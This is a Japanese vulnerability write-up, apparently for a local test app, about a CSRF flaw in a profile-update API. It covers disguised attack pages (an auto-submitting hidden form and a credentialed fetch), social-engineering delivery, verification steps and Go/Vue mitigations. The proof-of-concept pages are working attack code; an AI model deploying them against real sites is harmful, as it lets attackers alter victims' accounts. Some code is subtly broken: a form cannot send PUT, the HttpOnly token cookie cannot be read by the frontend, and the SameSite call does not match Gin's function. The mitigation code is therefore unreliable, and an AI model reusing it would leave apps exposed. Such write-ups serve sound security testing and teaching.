# プロフィール更新機能のCSRF

## 脆弱性の説明
プロフィール更新処理でCSRF対策が実装されていないため、クロスサイトリクエストフォージェリ（CSRF）攻撃が可能です。

## 影響範囲
- 不正なプロフィール更新
- ユーザー情報の改ざん
- 意図しない操作の実行

## 攻撃方法と手順

### 1. 基本的なCSRF攻撃

1. 攻撃者は以下のようなHTMLページを作成します：
   ```html
   <!DOCTYPE html>
   <html>
   <head>
     <title>景品が当たるキャンペーン</title>
   </head>
   <body onload="document.getElementById('csrf-form').submit();">
     <h1>キャンペーンページ</h1>
     <p>しばらくお待ちください...</p>
     
     <!-- 非表示のフォーム -->
     <form id="csrf-form" action="http://localhost:9090/api/profile" method="PUT" style="display:none;">
       <input type="text" name="nickname" value="ハッキングされました">
       <input type="text" name="bio" value="このアカウントは乗っ取られました">
     </form>
   </body>
   </html>
   ```

2. 被害者がこのページにアクセスすると、自動的にプロフィール更新リクエストが送信されます
3. 被害者がアプリケーションにログイン済みの場合、Cookieが自動的に送信され、プロフィールが不正に更新されます

### 2. JavaScriptを使用したCSRF攻撃

1. 攻撃者は以下のようなHTMLページを作成します：
   ```html
   <!DOCTYPE html>
   <html>
   <head>
     <title>面白い動画サイト</title>
     <script>
       window.onload = function() {
         // 認証済みのユーザーのプロフィールを更新するリクエスト
         fetch('http://localhost:9090/api/profile', {
           method: 'PUT',
           credentials: 'include', // Cookieを含める
           headers: {
             'Content-Type': 'application/json'
           },
           body: JSON.stringify({
             nickname: 'ハッキングされました',
             bio: 'このアカウントは乗っ取られました'
           })
         });
       };
     </script>
   </head>
   <body>
     <h1>面白い動画</h1>
     <p>動画を読み込んでいます...</p>
   </body>
   </html>
   ```

2. 被害者がこのページにアクセスすると、JavaScriptコードが実行され、プロフィール更新リクエストが送信されます
3. 被害者がアプリケーションにログイン済みの場合、Cookieが自動的に送信され、プロフィールが不正に更新されます

### 3. ソーシャルエンジニアリングを組み合わせたCSRF攻撃

1. 攻撃者は魅力的な景品や情報を提供するWebサイトを作成し、上記のCSRFコードを埋め込みます
2. 攻撃者はSNSやメールなどで被害者に対して、そのWebサイトへのリンクを送信します
3. 被害者がリンクをクリックしてWebサイトにアクセスすると、バックグラウンドでCSRF攻撃が実行されます

## 攻撃成功の確認手順

### 1. テスト用のCSRFページの作成

1. 上記のHTMLコードをコピーして、`csrf-test.html`などのファイル名で保存します
2. ローカルでHTTPサーバーを起動します（例：`python -m http.server 8000`）
3. 別のブラウザまたはプライベートウィンドウでアプリケーションにログインします
4. ブラウザで`http://localhost:8000/csrf-test.html`にアクセスします

### 2. プロフィール変更の確認

1. CSRF攻撃ページにアクセスした後、アプリケーションのプロフィールページに移動します
2. プロフィール情報が攻撃ページで指定した値に変更されていることを確認します
3. アプリケーションのログには、プロフィール更新のリクエストが記録されているはずです

### 3. ネットワークリクエストの確認

1. ブラウザの開発者ツールを開きます（F12キー）
2. 「Network」タブを選択します
3. CSRF攻撃ページにアクセスします
4. プロフィール更新リクエスト（`/api/profile`へのPUTリクエスト）が送信されていることを確認します
5. リクエストに認証Cookieが含まれていることを確認します

## 対策方法
### 1. CSRFトークンの実装
```go
// バックエンド（Go）
func generateCSRFToken(c *gin.Context) string {
    token := uuid.New().String()
    c.SetCookie("csrf_token", token, 3600, "/", "", true, true)
    return token
}

func validateCSRFToken(c *gin.Context) bool {
    cookie, err := c.Cookie("csrf_token")
    if err != nil {
        return false
    }
    token := c.GetHeader("X-CSRF-Token")
    return cookie == token
}
```

```javascript
// フロントエンド（Vue）
// APIリクエスト時にCSRFトークンを設定
axios.interceptors.request.use(config => {
  const token = getCookie('csrf_token');
  if (token) {
    config.headers['X-CSRF-Token'] = token;
  }
  return config;
});
```

### 2. SameSite属性の設定
```go
// セッションCookieの設定
c.SetCookie("session", sessionID, 3600, "/", "", true, true, http.SameSiteStrictMode)
```
